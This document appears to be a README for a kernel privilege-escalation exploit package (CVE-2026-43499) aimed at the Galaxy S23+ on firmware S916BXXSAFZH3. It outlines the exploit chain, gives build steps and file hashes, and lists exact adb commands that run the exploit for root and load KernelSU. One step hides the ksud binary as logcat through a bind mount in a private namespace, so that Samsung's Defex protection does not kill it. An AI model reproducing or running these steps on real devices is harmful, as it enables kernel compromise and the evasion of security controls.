# Galaxy S23+ SM-S916B (S916BXXSAFZH3) payload

Exact firmware profile for the Galaxy S23+ on firmware `S916BXXSAFZH3`
(`samsung/dm2qxxx/dm2q:16/BP4A.251205.006/S916BXXSAFZH3`), kernel
`5.15.189-android13-8-33413713-abS916BXXSAFZH3`.

## Hardware evidence

The full chain completed twice on real `SM-S916B` FZH3 hardware from
`adb shell`: tracefs KASLR slide, controlled 32-object `mm_struct` group,
shaped order-3 SKB reclaim, MCAST waiter write, fake ashmem fops, configfs
arbitrary read/write, pipe physical read/write, and root UMH
(`done=1 root=1 uid=2000->0`, `uid=0(root) context=u:r:kernel:s0`,
SELinux Permissive). Successful boots so far: 2 of 5 attempts; the failures
were a lost kernelsnitch-collision scan and a failed UMH prepublish write,
both fixed by a reboot and rerun.

KernelSU late-load with the FZG1 `ksud-dm2q-S916BXXSAFZG1-kdp` loader pair
was verified on this FZH3 device: module loads (`Live` in `/proc/modules`),
KernelSU Manager reports `Working <LKM>`, and `su -c id` returns
`uid=0(root) context=u:r:ksu:s0` under SELinux enforcing. The module load
itself re-enforces SELinux, which blocks the exploit daemon's socket from
the shell domain; complete the KernelSU handoff before relying on the
daemon.

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `880ea495f9beba1ad39544170de8c2d6adbf9dd59141f01b2931cd7003e8ecc7` |
| `cve-2026-43499-root` | `54894e9bfa80fc36cfa03bd4ec4279e1d56eccc9719c9ee395b64ffd6792866b` |
| `../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp` | `5da5818d36da2d589496f91016078a43f50489e5c98b319db4eaa5ee475b86bd` (cross-build use on FZH3, see above) |

## Build

```sh
make TARGET=dm2q-S916BXXSAFZH3 ANDROID_NDK_HOME=/path/to/android-ndk-r29
```

## Per-boot usage

Everything is volatile; a reboot removes root and the KernelSU module.

```cmd
adb push cve-2026-43499-app.so /data/local/tmp/dm2q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push ../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-s25u-kdp"
```

Wait about one minute after a fresh boot, then run one attempt per boot:

```cmd
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/dm2q.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/dm2q-fzh3.log"
```

Verify shell root, stage `ksud`, and run the guarded late-load while the
device is still Permissive (the current `su_daemon.c` passes `--ephemeral`,
which this ksud build does not accept, so the guarded invocation is
replicated manually):

```cmd
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'unshare -m sh -c \"mount --bind /data/local/tmp/ksud-s25u-kdp /system/bin/logcat && exec logcat late-load --package-name me.weishu.kernelsu\" > /data/local/tmp/ksud-late.log 2>&1'"
adb shell "grep kernelsu /proc/modules"
adb shell "su -c id"
```

Direct execution of `ksud` from `/data/local/tmp` is Defex-killed
(`Killed`, rc=137); only the logcat-disguised invocation inside a private
mount namespace loads the module. Expect retries: failed attempts leave PI
state behind and the runner refuses in-boot retries by design.
